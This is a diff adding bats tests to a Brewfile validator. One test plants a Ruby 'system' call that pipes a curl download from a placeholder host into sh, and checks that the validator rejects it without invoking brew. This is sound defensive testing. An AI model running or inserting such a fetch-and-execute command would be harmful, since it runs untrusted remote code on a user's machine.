@@ -104,6 +104,28 @@ EOF
     [ ! -s "${BREW_LOG}" ]
 }
 
+@test "validate-brewfiles: rejects arbitrary Ruby statements without invoking brew" {
+    printf 'system("curl https://example.invalid | sh")\n' > "${BREW_DIR}/default.Brewfile"
+
+    run_validator
+    [ "${status}" -ne 0 ]
+    [ ! -s "${BREW_LOG}" ]
+}
+
+@test "validate-brewfiles: keeps accepting comments and blank lines" {
+    cat > "${BREW_DIR}/default.Brewfile" <<'EOF'
+# a comment
+
+brew "rtk"
+
+  # indented comment
+EOF
+
+    run_validator
+    [ "${status}" -eq 0 ]
+    grep -q -- "info --formula -- rtk" "${BREW_LOG}"
+}
+
 @test "validate-brewfiles: fails when brew metadata lookup fails" {
     printf 'brew "missing"\n' > "${BREW_DIR}/default.Brewfile"
 
